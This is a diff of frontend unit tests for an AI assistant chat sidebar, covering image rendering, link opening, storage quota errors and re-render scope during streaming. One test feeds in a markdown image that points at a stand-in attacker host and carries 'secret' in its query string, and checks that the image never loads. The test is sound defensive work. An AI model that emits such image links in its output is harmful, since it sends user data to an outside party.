@@ -693,3 +693,63 @@ describe("translations", () => {
 		}
 	});
 });
+
+describe("review findings", () => {
+	test("markdown images are shown as their alt text and never load", () => {
+		setup();
+		reply("Leak ![secret data](https://attacker.example/p.png?d=secret) here");
+		expect($$(".assistant_message img:not(.icon)")).toHaveLength(0);
+		expect($(".assistant_message .span_message")!.innerHTML).not.toContain("attacker.example");
+		expect($(".assistant_message")!.textContent).toContain("secret data");
+	});
+
+	test("web links open without a handle back to the sidebar", () => {
+		setup();
+		const calls: unknown[][] = [];
+		window.open = ((...args: unknown[]) => { calls.push(args); return null; }) as any;
+		reply("[web](https://example.com)");
+		fireEvent.click($$("a").find((a) => a.textContent === "web")!);
+		expect(calls).toEqual([["https://example.com/", "_blank", "noopener"]]);
+	});
+
+	test("a full storage still answers onUpdateState", () => {
+		setup();
+		const setItem = vi.spyOn(localStorage, "setItem").mockImplementation(() => { throw new Error("QuotaExceededError"); });
+		const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+		fire("onUpdateState");
+		expect(sent.pop()).toEqual(["onUpdateState", undefined]);
+		setItem.mockRestore();
+		warn.mockRestore();
+	});
+
+	test("a stream chunk re-renders only the streaming message, not the history", async () => {
+		const { options } = await import("preact");
+		setup();
+		for (let i = 0; i < 20; i++) {
+			submit("question " + i);
+			fire("onToolCallStart", { type: "native", id: "t" + i, functionName: "readDocument", humanName: "Read", arguments: "{}" });
+			fire("onToolCallEnd", { type: "native", id: "t" + i, functionName: "readDocument", arguments: "{}", result: { message: "ok" } });
+			reply("answer " + i);
+		}
+		submit("last");
+		fire("onChatStreamStart");
+		fire("onChatStreamChunk", "first ");
+		// Message components, not their memo() wrappers (names are minified here).
+		const renderedItems = new Set<number>();
+		const prev = (options as any).diffed;
+		(options as any).diffed = (vnode: any) => {
+			const type = vnode.type;
+			const isMemoWrapper = typeof type === "function" && /^Memo\(/.test(type.displayName || "");
+			if (typeof type === "function" && !isMemoWrapper && vnode.props && vnode.props.item)
+				renderedItems.add(vnode.props.item.id);
+			prev && prev(vnode);
+		};
+		try {
+			fire("onChatStreamChunk", "chunk");
+		} finally {
+			(options as any).diffed = prev;
+		}
+		expect(renderedItems.size).toBe(1);
+		expect($$(".assistant_message").pop()!.textContent).toContain("first chunk");
+	});
+});
